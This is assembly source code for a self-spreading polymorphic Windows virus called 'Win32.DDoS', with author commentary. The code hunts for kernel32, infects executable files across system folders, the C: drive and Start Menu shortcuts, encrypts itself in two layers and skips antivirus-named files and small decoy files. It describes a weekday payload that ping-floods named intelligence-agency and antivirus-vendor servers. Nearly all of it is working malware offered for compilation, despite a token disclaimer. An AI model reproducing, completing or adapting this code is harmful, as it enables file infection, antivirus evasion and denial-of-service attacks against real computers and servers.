;
; ***************************************************************************
; -----------------[ Win32.DDoS by SnakeByte { KryptoCrew } ]----------------
; ***************************************************************************
;
;
;
; Please note that it is illegal to spread viruses, so if you compile this
; code, just test it on a closed system and don't place it in the wild !
; I am not responsible for your actions .. as always ;)
;
;
;
;
; This is the first Windows Virus I've written so far, and some parts are from
; Win32.Aztec by Billy Beleceb, because at the time i wrote this thing, not everything
; was clear in my mind, as it is now, hope I can present you some better things from me
; in the future.
;
; This is also my first polymorphic virus ever ;) so don't expect too much from the
; poly engine. I did not understand much of the code from other poly engines, but
; now, after coding one on my own, I do, so I maybe can code a better one the next time ;)
;
; The first layer is nearly completely polymorphic. I use junk opcodes like mov, add ...
; and try to keep track that they don't look completely useless. 
; I also use several ways to decrypt the virus ( xor, neg, not .. ) and
; several methods to do the loop. The size will always be in ECX and 
; the start in ESI, but i use several methods to put the values inside
; the registers so there is nothing static.
; The only static thing left is the call to the polymorphic decryptor ;(
;
;
; I was just able to test this thing on a Win95 PC, so I don't know if it will
; work on other systems, but I think it will. Two friends made some tests under
; NT and 2k with a beta, and it worked, so I hope this final version will also do.
;
;
; It tries to get the 4 following API's:
;
;   - Kernel32.dll       <- the only one we really need to work, the others are for fun 
;
;   - Imagehlp.dll       <- try to create a valid CRC for the PE-Header of infected files
;   - Advapi32.dll       <- get some data from the registry
;   - Winsck32.dll       <- Payload : Ping-flood a server
;
;
;
;
; What does this Virus do :
;
;   - 1.st Generation infects just the current directory ( easier to infect just some files *eg* )
;   - Get's API's with LoadLibraryA & GetProcAddress
;   - Tries to load ImageHlp.dll to create checksums with the CheckSumMappedFile Function
;   - Infects the current, the windows and the system directory and parses some 
;       random directory's on drive C:
;   - Follows LNK - Files ( does not work with NT / 2k )
;   - Removes and restores File-Attributes
;   - Parses Drive C:, enters a folder with a chance of 1 to 3
;   - Retrieves the Startmenue from registry and parses it ( follows LNK-Files there ) 
;   - If everything runs well it will infect 100 files all over the disk
;   - Generates a polymorph decryptor which will be used for all files infected in one run
;   - Uses 2 layers of decryption ( 1st is poly, 2nd is harder to debug / emulate )
;   - Does not infect files smaller than 40 kb
;   - Will not infect files with AV, AN or DR in the filename
;   - Payload is a icmp flood on one of these servers :
;
;      Sunday    = www.bundesnachrichtendienst.de
;      Monday    = French Secret Service ( dgse.citeweb.net )
;      Tuesday   = www.avp.com ( AV )
;      Wednesday = www.lockdown2000.com
;      Thursday  = www.f-secure.com 
;      Friday    = www.norton.com
;      Saturday  = www.zonelabs.com
;
; *#  Please note that i choose these servers because I think they can       #*
; *#  handle such an attack, if any idiot would release this into the wild.  #*
;
;
;
;
;
;
;         To make this code working use TASM 5.0 and pewrsec.
;   
;
;
;
;
;
;  Thanks and greetz fly to these people:
;
;    Billy Beleceb  -  Your Win32 VWG is just great ..
;                      ( you'll find some of your code [Win32.Aztec] here ;)
;    Evul           -  Thanks for hosting my site at coderz.net
;    Ciatrix        -  Hope you carry on your good work with VDAT !
;    SnakeMan       -  Hope you get more entrys *g* -->  http://altavirus.cjb.net
;    PhilippP       -  Thanks for the thrilling test in 2k .. ;)
;    BumbleBee      -  Still thinking of Sex ?
;    diediedie      -  Thnx for demotivating me... :)
;    asmodeus       -  nice beginner lesson in poly ;)
;    darkman        -  just believe me: the question was stupid ;)
;
;
;
;
;
; ***************************************************************************
; ---------------------------[ Here we start ]-------------------------------
; ***************************************************************************

.586p
.model flat
jumps                      ; Jumps get calculated
                           ; ( I know not good for optimizing.. )
.radix 16                  ; All numbers are Hexadecimal 
                           ; I once searched for a forgotten 'h'
                           ; 2 weeks until I found this bug.. :P

                           ; some API's
extrn ExitProcess:PROC     ; fake host for 1. Generation

extrn MessageBoxA:PROC     ; For testing purposes ( no longer needed )
                           ; but i needed it for error-detection *g*
                           ; 'cause I am too stupid to work with softice.. :(

.data                      ; fake data for TASM
 db ?                      ; otherwise TASM would not compile this
                           ; we store all our data in the code
                           ; section, that's why we need to use
                           ; pewrsec after compiling, to set the 
                           ; code section flags to write !

                           ; some constants I don't want to calculate on my own *g*
 VirusSize  equ (offset VirusEnd - offset Virus )
 CryptSize  equ (offset VirusEnd - offset CryptStart )
 NoCrypt    equ (offset CryptStart - offset Virus )
 FirstLSize equ (offset VirusEnd - offset FirstLayerStart )
 Buffersize equ (offset EndBufferData - offset VirusEnd )

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME                ENDS

.code

; ***************************************************************************
; -------------[ Delta Offset and searching for the Kernel Addy ]------------
; ***************************************************************************


Virus:                     ; Here we go

 call PDecrypt             ; call the poly decryption routine
                           ; which is located at the end of virus
                           ; just a simple 'ret' in the first generation

FirstLayerStart:           ; here starts the first layer
                           ; everything will be crypted from here on

 call Delta                ; let's get the delta - offset

Delta:
 mov ebp, offset Delta     ; I want to do this a bit different
 neg ebp                   ; than usual, who knows, maybe this
 pop eax                   ; fools some bad heuristics
 add ebp, eax

 or ebp, ebp               ; we don't need to decrypt the 1.
 jz CryptStart             ; Generation

                           ; save esp
 mov dword ptr [ebp+XESP], esp


 mov ecx, (CryptSize / 2)  ; the lenght of crypted part in words
 mov dx, word ptr [ebp+Key]
 lea esp, [ebp+CryptStart] ; set esp to the start of the decrypted part

DeCryptLoop:               ; let's decrypt the virus
 pop ax                    ; we pop the body word by word
 inc dx                    ; this method fucks with debuggers, who
 xchg dl, dh               ; trace with int 1h ( destroys stack )
 xchg al, ah
 xor ax, dx
 not ax
 push ax
 add esp, 2h
loop DeCryptLoop
                           ; restore esp
mov esp, dword ptr [ebp+XESP]

 jmp CryptStart            ; start virus

 Key      dw 0h            ; our key
 XESP     dd 0h            ; we save the esp here

 db 4 dup (90h)            ; some nop's so we will not jump into a instruction
                           ; ( happened sometimes during testing :( )
                           ; because of the prefech queue buffer ( or whatever this is spelled .. )
CryptStart:
                           ; we save these two values ( EIP & Imagebase )
                           ; to be able to return to the original host..
 mov eax, dword ptr [ebp+OldEIP]
 mov dword ptr [ebp+retEIP], eax
 mov eax, dword ptr [ebp+OldBase]
 mov dword ptr [ebp+retBas], eax

 mov eax, dword ptr fs:[0] ; save the original SEH
 mov dword ptr [ebp+SEH_Save], eax

 mov esi, [esp]            ; let's get the return address of the Create Process API
 xor si, si                ; round it to a full page

 push dword ptr [ebp+Error_ExecuteHost]
 mov fs:[0], esp           ; set new SEH

 call GetKernel            ; try to get it
 jnc GetApis               ; If got it we try to retrieve the API's

                           ; Otherwise, we try to check for
                           ; the kernel at some fixed addresses
                           ; But the way above should work most
                           ; of the times.. :)

 mov esi, 0BFF70000h       ; try the Win95 Kernel Addy
 call GetKernel
 jnc GetApis
 
 mov esi, 077F00000h       ; try the WinNT Kernel Addy
 call GetKernel
 jnc GetApis
 
 mov esi, 077e00000h       ; try the Win2k Kernel Addy
 call GetKernel
 jnc GetApis
                           ; if we still did not found the
 jmp Error_ExecuteHost     ; kernel we stop the virus
                           ; and execute the goat


; ***************************************************************************
; -------------------------[ let's get the API's ]---------------------------
; ***************************************************************************

 
                           ; These are the 2 API's we search in the Kernel
                           ; we need them to get all the others API's 
                           ; I prefer LoadLibraryA to GetModuleHandle, 
                           ; because it is no longer nessecairy, that the
                           ; file we infect loads the dll files we need,
                           ; we load them on our own,... ;)
                           ; This means, we can use almost any API we want to *eg*
                           ; LoadLibraryA also returns the Module-Handle, but
                           ; if it is not loaded it loads it ... bla.. ;P

 LL  db 'LoadLibraryA', 0h ; we need these API's for searching..
 GPA db 'GetProcAddress', 0h 

GetApis:                   ; Offset of the Kernel32.dll PE-Header is in EAX

 mov [ebp+KernelAddy], eax ; Save it 
 mov [ebp+MZAddy], ebx

 lea edx, [ebp+LL]         ; Points to name of the LoadLibaryA - API
 mov ecx, 0Ch              ; Lenght of Name
 call SearchAPI1           ; search it.. 
 mov [ebp+XLoadLibraryA], eax
                           ; Save the Addy

 xchg eax, ecx             ; If we didn't get this API or the other one, we quit !
 jecxz ExecuteHost         ; thnx to Billy  ;)
   
 lea edx, [ebp+GPA]        ; Points to name of the GetProcAddress - API
 mov ecx, 0Eh              ; Lenght of Name
 call SearchAPI1
 mov [ebp+XGetProcAddress], eax
                           ; Save the Addy

 xchg eax, ecx             ; check if we failed
 jecxz ExecuteHost         ; ( thnx again, nice way of optimization *g* )

                           ; Now we have our 2 nessecairy API's
 jmp GetAPI2               ; and are able to get the others 
                           ; Yes I know this jmp is not very optimizing.. ;)
                           ; But storing the data here helps me understanding
                           ; my code *bg* 

                           ; this dll is delivered with every version
 KERNEL32  db 'Kernel32',0 ; of windows, so we will get it always ( ..most likely *g* )
                           ; the virus relies on it

 IMAGEHLP  db 'Imagehlp',0 ; this dll is not nessecairily needed, but dll's will
                           ; only get infected, if we are able to use the CheckSumMappedFile
                           ; Function from this dll to create a checksum
                           ; it is delivered with win9x, NT and several compilers.

 ADVAPI    db 'advapi32',0 ; this dll is neccessairy to retrieve the startmenue folder
                           ; from registry, so we are able to follow the shortcuts there

 WSOCK     db 'wsock32.dll',0
                           ; we need this one here to perform a ping
                           ; ( not needed for the virus, but the payload )

GetAPI2:                   ; We get them, by grabbing the handles of
                           ; different DLL's first and use GetProcAddress
                           ; to locate the API's itself

                           ; Let's get the Handles by calling
                           ; the LoadLibrary API.. :)
                           ; if we fail to get the
                           ; Kernel32, we execute the 
                           ; original host

 lea eax, [ebp+KERNEL32]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+K32Handle], eax
 test eax, eax
 jz ExecuteHost

 lea eax, [ebp+IMAGEHLP]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+IHLHandle], eax

 lea eax, [ebp+ADVAPI]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+ADVHandle], eax

 lea eax, [ebp+WSOCK]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+W32Handle], eax


 lea esi, [ebp+Kernel32Names]
 lea edi, [ebp+XFindFirstFileA]
 mov ebx, [ebp+K32Handle]
 push NumberOfKernel32APIS
 pop ecx
 call GetAPI3

 lea esi, [ebp+ImageHLPNames]
 lea edi, [ebp+XCheckSumMappedFile]
 mov ebx, [ebp+IHLHandle]
 xor ecx, ecx
 inc ecx
 call GetAPI3

 lea esi, [ebp+ADVAPI32Names]
 lea edi, [ebp+XRegOpenKeyExA]
 mov ebx, [ebp+ADVHandle]
 push 3d
 pop ecx
 call GetAPI3


 lea esi, [ebp+WSOCK32Names]
 lea edi, [ebp+Xsocket]
 mov ebx, [ebp+W32Handle]
 push 3d
 pop ecx
 call GetAPI3


; ***************************************************************************
; ------------------[ Outbreak ! Here we start infecting ]-------------------
; ***************************************************************************

                           ; Now we got everything we need to
                           ; start infecting some files *eg*
                           ; First of all we retrieve the
                           ; foldernames of the current folder,
                           ; the system folder, and the windows folder
                           ; these are the folders we start to infect
 lea edi, [ebp+curdir]
 push edi
 push 7Fh
 call dword ptr [ebp+XGetCurrentDirectoryA]


 call genPoly              ; before we infect anything, we
                           ; create a poly decryptor used for
                           ; all files we infect = slow poly !

 mov [ebp+InfCounter], 10d ; Number of files we want to infect !
 call InfectCurDir         ; first of all we infect the current directory

 or ebp, ebp               ; if this is the first generation, we infect just
 jz ExecuteHost            ; the first directory ( makes it easier to infect
                           ; just some files .. *g*
                           ; we also don't start the payload !

 push 7Fh                  ; buffer - size
                           ; 7fh = 127d = max lenght of Directory name
 lea edi, [ebp+windir]     ; Pointer to the offset where we save the directory
 push edi               
 call dword ptr [ebp+XGetWindowsDirectoryA]

 lea edi, [ebp+windir]     ; then we infect the windows directory
 push edi
 call dword ptr [ebp+XSetCurrentDirectoryA]
 mov [ebp+InfCounter], 10d
 call InfectCurDir

                           ; we save both directory's in the same buffer
 push 7Fh                  ; so we save 127 Bytes of the Buffersize
 lea edi, [ebp+windir]
 push edi
 call dword ptr [ebp+XGetSystemDirectoryA]

 lea edi, [ebp+windir]     ; and the system directory ..
 push edi
 call dword ptr [ebp+XSetCurrentDirectoryA]
 mov [ebp+InfCounter], 10d
 call InfectCurDir

                           ; if everything went fine, we have
                           ; infected now up to 30 files !
                           ; Is this enough ?
                           ; ( please note that this is a rhetorical question *g* )
                           ; We want more !


; ***************************************************************************
; -----------------------[ Parse Directory's ]-------------------------------
; ***************************************************************************

InitParsing:

 mov [ebp+InfCounter], 30d ; let's parse some directorys for
                           ; 30 more files !

 lea edi, [ebp+RootDir]
 call dword ptr [ebp+XSetCurrentDirectoryA]
 call ParseFolder

                           ; if we are not able to access the registry we
                           ; infect another 20 Files in the System-Directory

 cmp dword ptr [ebp+XRegOpenKeyExA], 0h
 je InfectWinDirAgain
 call GetStartMenue        ; last but not least, we try to parse the
                           ; start-menue folder ( follow the LNK's )
                           ; to get 20 more files
                           ; with some luck, we infect 100 files each run
                           ; all over the HD *g* 
                           ; I think this can be called successfull spreading *g*
 lea edi, [ebp+windir]
 call dword ptr [ebp+XSetCurrentDirectoryA]

InfectWinDirAgain:
 mov [ebp+InfCounter], 20d
 call ParseFolder          ; let's parse the startmenue and follow all
                           ; LNK-Files inside ;)

 jmp PayLoad               ; start the evil part of this thingie ..


ParseFolder:
 call InfectCurDir         ; infect the current directory
 cmp [ebp+InfCounter],0
 jbe EndParsing            ; we infected enough ? ok, leave !

 lea esi, [ebp+Folders] 
 Call FindFirstFileProc
 inc eax
 jz EndParsing             ; If there are no directorys we return
 dec eax                   ; otherwise we save the handle 

GetOtherDir:
                           ; first of all we check if this
                           ; is a valid directory
 mov eax, dword ptr [ebp+WFD_dwFileAttributes]
 and eax, 10h              ; if not we get the next 
 jz NoThisOne              ; one

 lea esi, [ebp+WFD_szFileName]
 cmp byte ptr [esi], '.'   ; we will not parse into . or ..
 je NoThisOne              ; directorys

 push 03h
 pop ecx
 call GetRand

 dec edx                   ; if division-rest (edx) = 1
 jz ParseNewDir            ; we get this directory

NoThisOne:

 call FindNextFileProc

 test eax, eax
 jnz GetOtherDir

EndParseDir2:              ; we close the search - Handle 

 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

EndParsing:                ; we just return
 ret

ParseNewDir:               ; we got a direcory, let's change to it
                           ; and infect it.. *eg*
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 lea esi, [ebp+WFD_szFileName]
 push esi
 call dword ptr [ebp+XSetCurrentDirectoryA]


jmp ParseFolder

; ***************************************************************************
; -----------------[ Let's get the Startmenue folder ]-----------------------
; ***************************************************************************


GetStartMenue:             ; Let's try to open HKEY_USERS registry Key

 lea esi, [ebp+RegHandle]
 push esi
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 lea esi, [ebp+SubKey]
 push esi
 push 80000003h            ; HKEY_USERS
 call dword ptr [ebp+XRegOpenKeyExA]

 test eax, eax             ; if we failed opening the key, we return
 jnz NoStartMenue

                           ; let's get the value
 lea esi, [ebp+BufferSize]
 push esi
 lea esi, [ebp+windir]
 push esi
 lea esi, [ebp+ValueType]
 push esi                  ; Type of Value
 push 0                    ; reserved
 lea esi, [ebp+Value]
 push esi                  ; ValueName
 mov eax, [ebp+RegHandle]
 push eax                  ; Reg-Key Handle
 call dword ptr [ebp+XRegQueryValueExA] 

 mov eax, dword ptr [ebp+RegHandle]
 push eax
 call dword ptr [ebp+XRegCloseKey]

NoStartMenue:

ret

SubKey     db '.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
Value      db 'Start Menu',0
ValueType  dd 0h           ; Type of registry Value
BufferSize dd 7Fh          ; size of buffer

; ***************************************************************************
; ----------------[ API - Tables and some other data ]-----------------------
; ***************************************************************************

                           ; Misc Data .. ;)
 Folders db '*.',0         ; search for directory's
 RootDir db 'C:\',0        ; we want to start parsing at root of Drive C:

                           ; Here follow the tables of the api's we use
                           ; for our virus, if you want to know what they
                           ; do exactly simply check the Win32
                           ; Programmer's Reference
                           ; I won't explain them ( I think the names of them
                           ; makes it clear enough *g* )

Kernel32Names:             ; 17d API's we want from Kernel32.dll

 NumberOfKernel32APIS equ 17d

 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'FindClose', 0
 db 'CreateFileA', 0
 db 'SetFileAttributesA', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'MapViewOfFile', 0
 db 'UnmapViewOfFile', 0
 db 'GetWindowsDirectoryA', 0
 db 'GetSystemDirectoryA', 0
 db 'GetCurrentDirectoryA', 0
 db 'SetCurrentDirectoryA', 0
 db 'GetFileAttributesA', 0
 db 'GetTickCount', 0
 db 'CreateThread',0
 db 'GetSystemTime',0

ImageHLPNames:
 db 'CheckSumMappedFile', 0h

ADVAPI32Names:
 db 'RegOpenKeyExA',0
 db 'RegQueryValueExA',0
 db 'RegCloseKey',0

WSOCK32Names:
 db 'socket',0
 db 'WSACleanup',0
 db 'WSAStartup',0
 db 'closesocket',0
 db 'sendto',0
 db 'setsockopt',0

; ***************************************************************************
; --------------[ Retrieve API's with GetProcAddress ]-----------------------
; ***************************************************************************

                           ; esi points to the Table of Names
                           ; edi to the offsets
                           ; ebx contains the module-handle
                           ; ecx the number of API's
GetAPI3:
 push ecx                  ; save ecx

 push esi                  ; push api-name 
 push ebx                  ; Push Module-Handle
                           ; call GetProcAddress

 call dword ptr [ebp+XGetProcAddress]
 stosd                     ; store api-offset 

 pop ecx                   ; did we get them all ?
 dec ecx
 jz EndApi3                ; if yes then return

 push ecx                  ; otherwise move esi to next API-Name

SearchZero:                ; we search for the end of the current
 cmp byte ptr [esi], 0h
 je GotZero                ; api name ( always 0h ) and increase
 inc esi
 jmp SearchZero
 
GotZero:
 inc esi
 pop ecx                   ; get ecx ( counter )

 jmp GetAPI3               ; retrieve Next API

 EndApi3: 
 ret 

 
; ***************************************************************************
; --------------[ Search Kernel Export Table for API's ]---------------------
; ***************************************************************************


SearchAPI1:                ; In this procedure we search for the first 2 API's
                           ; clear the counter
 and word ptr [ebp+counter], 0h
 
 mov eax, [ebp+KernelAddy] ; Load the PE-Header Offset

 mov esi, [eax+78h]        ; Get Export Table Address
 add esi, [ebp+MZAddy]     ; normalize RVA
 add esi, 1Ch              ; skip not needed data
                           ; now we gave the Address Table RVA-Offset in esi
 
 lodsd                     ; Get Address Table RVA
 add eax, [ebp+MZAddy]     ; convert to VA and save it
 mov dword ptr [ebp+ATableVA], eax

 lodsd                     ; Get Name Pointer Table RVA
 add eax, [ebp+MZAddy]     ; make it VA and save it
 mov dword ptr [ebp+NTableVA], eax
 
 lodsd                     ; Get Ordinal Table RVA
 add eax, [ebp+MZAddy]     ; guess what ? *g*
 mov dword ptr [ebp+OTableVA], eax

 mov esi, [ebp+NTableVA]   ; Get the Name Pointer Table Addy in esi


SearchNextApi1:
 push esi                  ; Save Pointer Table
 lodsd
 add eax, [ebp+MZAddy]     ; make it VA

 mov esi, eax              ; API Name in the Kernel Export API
 mov edi, edx              ; API we are looking for
 push ecx                  ; save the size

 cld                       ; Clear direction Flag
 rep cmpsb                 ; Compare it
 pop ecx
 jz FoundApi1              ; Are they equal ?

 pop esi                   ; Get the Pointer Table
 add esi, 4h               ; Set Pointer to the next api
 inc word ptr [ebp+counter] 
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1        ; test next API
 
FoundApi1:
 pop esi                   ; clear stack ( we don't want buffer overflows 
                           ; ok, we want them, but not here *bg* )

 movzx eax, word ptr [ebp+counter]
 shl eax, 1h               ; multiply eax with 2
                           ; Make eax Point to the right entry inside the
                           ; Ordinal Table
 add eax, dword ptr [ebp+OTableVA]
 xor esi, esi              ; clear esi
 xchg eax, esi             ; make esi point to the entry
 lodsw                     ; get Ordinal in AX
 shl eax, 2h               ; eax * 4
 add eax, dword ptr [ebp+ATableVA]
 mov esi, eax              ; esi points to the address RVA
 lodsd                     ; eax = address RVA
 add eax, [ebp+MZAddy]     ; Make it VA

 ret                       ; Return with API-Addy in eax
 
NotFoundApi1:
 xor eax, eax              ; We didn't find the API we need :(
 ret                       ; We set EAX to 0 to show we have to
                           ; return to the host..

; ***************************************************************************
; -------------------[ Execute the original Program ]------------------------
; ***************************************************************************



ExecuteHost:               ; Here we execute the original program

 lea edi, [ebp+curdir]     ; we return to the original directory..
 push edi
 call dword ptr [ebp+XSetCurrentDirectoryA]

 or ebp, ebp               ; if this is a virus of the first generation
 jz FirstGenHost           ; we can't return to a host, so we
                           ; stop this with ExitProcess..
Error_ExecuteHost:
 mov eax, dword ptr [ebp+SEH_Save]
 push eax
 mov fs:[0], esp


 mov eax,12345678h         ; here we return to
 org $-4                   ; the old entry point
 retEIP dd 0h              ; of the infected file

 add eax,12345678h
 org $-4
 retBas dd 0h

 jmp eax


FirstGenHost:
 push 0h                   ; Stop executing this stuff ( first Generation
 call ExitProcess          ; only )


 OldEIP  dd 0h             ; Old Entry Point
 OldBase dd 0h             ; Old Imagebase

 NewEIP  dd 0h             ; New Entry Point ( points to our virus.. )

; ***************************************************************************
; ----------------[ We try to find the Kernel Address ]----------------------
; ***************************************************************************

GetKernel:                 ; Here we try to retrieve the Kernel
                           ; set search range
 mov byte ptr [ebp+K32Trys], 5h

GK1:
 cmp byte ptr [ebp+K32Trys], 00h
 jz NoKernel               ; Did we pass our limit of 50 pages ?

 call CheckMZSign          ; Has this Page a DOS EXE-Header ?
 jnc CheckPE

GK2:
 sub esi, 10000h           ; Get the next page
 dec byte ptr [ebp+K32Trys]
 jmp GK1                   ; Check it

CheckPE:                   ; Let's check if we really found
 mov edi, [esi+3Ch]        ; the Kernel32.dll PE-Header
 add edi, esi
 call CheckPESign          ; check for PE-Sign

 jnc CheckDLL              ; check for the DLL-Flag
 jmp GK2

CheckDLL:
 add edi, 16h              ; check for the Dll-Flag 
 mov bx, word ptr [edi]    ; get characteristics
 and bx, 0F000h            ; we need just the Dll-Flag
 cmp bx, 02000h
 jne GK2                   ; if it is no dll go on searching
 
KernelFound:               ; we found the Kernel32.dll
 sub edi, 16h              ; set edi to the PE - Header
 xchg eax, edi             ; save PE address in eax
 xchg ebx, esi             ; save MZ address in ebx
 cld
 ret

NoKernel:                  ; if not found we don't set the carriage flag
 stc
 ret                       ; return if not found


 K32Trys      db 5h        ; Search-Range


; ***************************************************************************
; -----------------[ Infection of the current directory ]--------------------
; ***************************************************************************


InfectCurDir:              ; Here we infect the files in the current directory
                           ; we use the FindFirstFile - FindNextFile API's
                           ; to scan all files for PE-Executables and
                           ; LNK-Files.
 lea esi, [ebp+filemask]
 call FindFirstFileProc

 inc eax
 jz EndInfectCurDir1       ; If there are no files, we return
 dec eax

InfectCurDirFile:
                           ; filename in esi
 lea esi, [ebp+WFD_szFileName]
 call InfectFile           ; Try to infect it !
 
 cmp [ebp+InfCounter], 0h  ; if we infected enough files
 jna EndInfectCurDir2      ; we return

 call FindNextFileProc

 test eax, eax
 jnz InfectCurDirFile
 
EndInfectCurDir2:          ; we close the search - Handle 

 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

EndInfectCurDir1:          ; we just return
 ret


 InfCounter db 0h          ; Counter for the number of files we infect
                           ; at max in the current directory
                           ; ( could take too long if we want to infect them
                           ; all )

 FindHandle dd 0h          ; The handle for the FindFirstFile API

 filemask   db '*.*', 0    ; we search for all files, not just exe files

                           ; these structures are nessecairy
                           ; for the FindFileFirst - FindFileNext API's

; ***************************************************************************
; ---------------------[ Prepare infection of file  ]------------------------
; ***************************************************************************

InfectFile:                ; Here we prepare to infect the file 
                           ; the filename is in [ebp+WFD_szFileName]
                           ; we open it and check if it is something
                           ; we are able to infect...
                           ; esi points to the filename..

 cmp byte ptr [esi], '.'   ; check if we got .. or .
 je NoInfection
                           ; if the file is smaller than
                           ; 200 Bytes it will not get checked or
                           ; infected !

 cmp dword ptr [ebp+WFD_nFileSizeLow], 200d
 jbe NoInfection
                           ; we also don't infect it if it is too big
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection

 call CheckFileName        ; check for AV-Files
 jc NoInfection

                           ; Get File-Attributes
 lea eax, [ebp+WFD_szFileName]
 push eax
 call dword ptr [ebp+XGetFileAttributesA]
                           ; save them
 mov dword ptr [ebp+Attributes], eax

 inc eax
 jz NoInfection            ; if we failed we don't infect
 dec eax

 push 80h                  ; clean attributes
 lea eax, [ebp+WFD_szFileName]
 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax               ; if we fail, we don't open the file
 jz NoInfection            ; if we have no access to set the attributes,
                           ; we will surely not be allowed to change the file itself

 call OpenFile             ; open the file
 jc NoInfection            ; if we failed we don't infect..

 mov esi, eax
 call CheckMZSign          ; if it is an EXE file, we go on
 jc CheckLNK               ; otherwise we test if it is a LNK

 cmp word ptr [eax+3Ch], 0h
 je CheckLNK

 xor esi, esi              ; get the start of the PE-Header
 mov esi, [eax+3Ch]
                           ; if it lies outside the file we skip it
 cmp dword ptr [ebp+WFD_nFileSizeLow], esi
 jb Notagoodfile

 add esi, eax

 mov edi, esi
 call CheckPESign          ; check if it is an PE-Executable
 jc Notagoodfile
                           ; check infection mark --> DDoS
                           ; if it is there the file is already infected..

 cmp dword ptr [esi+4Ch], 'SoDD'
 jz Notagoodfile

 mov bx, word ptr [esi+16h]; get characteristics
 and bx, 0F000h            ; we need just the Dll-Flag
 cmp bx, 02000h
 je Notagoodfile           ; we will not infect dll-files

 mov bx, word ptr [esi+16h]; get characteristics again
 and bx, 00002h            ; we check if it is no OBJ or something else..
 cmp bx, 00002h
 jne Notagoodfile         

 call InfectEXE            ; ok, infect it !
                           ; if there occoured an error
                           ; while mapping the file again,
                           ; we don't need to unmap & close it
 jc NoInfection
 jmp Notagoodfile

CheckLNK:                  ; check if we got an LNK-File
 mov esi, dword ptr [ebp+MapAddress]
 cmp word ptr [esi], 'L'   ; check for sign
 jne UnMapFile             ; if it is no LNK File we close it

 call InfectLNK

Notagoodfile:
 call UnMapFile            ; we store the file..
                           ; we restore the file-attributes

 push dword ptr [ebp+Attributes]
 lea eax, [ebp+WFD_szFileName]
 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 
NoInfection:
 ret


; ***************************************************************************
; ------------------------[ Open and close Files ]---------------------------
; ***************************************************************************

OpenFile:

 xor eax,eax               ; let's open the file 
 push eax
 push eax
 push 3h
 push eax
 inc eax
 push eax
 push 80000000h or 40000000h
 push esi                  ; name of file
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed                 ; if there is an error we don't infect the file
 dec eax                   ; now the handle is in eax
                           ; we save it 

 mov dword ptr [ebp+FileHandle],eax

                           ; if we map a file normal, we map it with the size
                           ; in the Find32-Data 
                           ; otherwise it is in ecx
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]

CreateMap: 
 push ecx                  ; save the size

 xor eax,eax               ; we create a map of the file to
 push eax                  ; be able to edit it
 push ecx
 push eax
 push 00000004h
 push eax
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]

 mov dword ptr [ebp+MapHandle],eax

 pop ecx                   ; get the size again.. 
 test eax, eax             ; if there is an error we close the file
 jz CloseFile              ; no infection today :(

 xor eax,eax               ; we map the file.. *bla*
 push ecx
 push eax
 push eax
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]

 or eax,eax                ; if there is an error, we unmap it
 jz UnMapFile
                           ; eax contains the offset where
                           ; our file is mapped.. *g*

 mov dword ptr [ebp+MapAddress],eax
                           ; Clear c-flag for successful opening
 clc

 ret                       ; we successfully opened it !

UnMapFile:                 ; ok, unmap it

 call UnMapFile2

CloseFile:                 ; let's close it

 push dword ptr [ebp+FileHandle]
 call [ebp+XCloseHandle]

Closed:
 stc                       ; set carriage flag
 
 ret

UnMapFile2:                ; we need to unmap it some times, to
                           ; map it again with more space..

 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]

 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]

 ret

  
; ***************************************************************************
; -------------------------[ Infect an EXE-FILE ]----------------------------
; ***************************************************************************

InfectEXE:                 ; MapAddress contains the starting offset of the file

                           ; we will not infect exe files, which are smaller than
                           ; 40 Kb, this is for avoiding goat files.
                           ; AV's use them to study viruses !

 cmp dword ptr [ebp+WFD_nFileSizeLow] , 0A000h
 jb NoEXE

 mov ecx, [esi+3Ch]        ; esi points to the PE-Header
                           ; ecx contains file-alignment
                           ; put size in eax

 mov eax, dword ptr [ebp+WFD_nFileSizeLow] 
 add eax, dword ptr [ebp+VirLen]
 
 call Align                ; align it and save the new size
 mov dword ptr [ebp+NewSize], eax
 xchg ecx, eax

 pushad                    ; save registers
                           ; we close the file and map it again,
                           ; but this time we will load it
                           ; with some more space, so we can add
                           ; our code *eg*
 call UnMapFile2
 popad

 call CreateMap            ; we map it again with a bigger size
                           ; if we got an error we return
 jc NoEXE
                           ; make esi point to the PE-Header again
                           ; get offset
 mov esi, dword ptr [eax+3Ch]
                           ; make it VA
 add esi, eax
 mov edi, esi              ; edi = esi
                           ; eax = number of sections
 movzx eax, word ptr [edi+06h]
 dec eax
 imul eax, eax, 28h        ; multiply with size of section header
 add esi, eax              ; make it VA
 add esi, 78h              ; make it point to dir table
                           ; esi points now to the dir-table

 mov edx, [edi+74h]        ; get number of dir - entrys
 shl edx, 3h               ; multiply with 8
 add esi, edx              ; make point to the last section

                           ; get the Entry Point and save it
                           ; we need it to be able to return
                           ; to the original file

 mov eax, [edi+28h]
 mov dword ptr [ebp+OldEIP], eax

                           ; get the imagebase, also needed to
                           ; execute original file
 mov eax, [edi+34h]
 mov dword ptr [ebp+OldBase], eax

 mov edx, [esi+10h]        ; size of raw data
                           ; we will increase it later
 mov ebx, edx
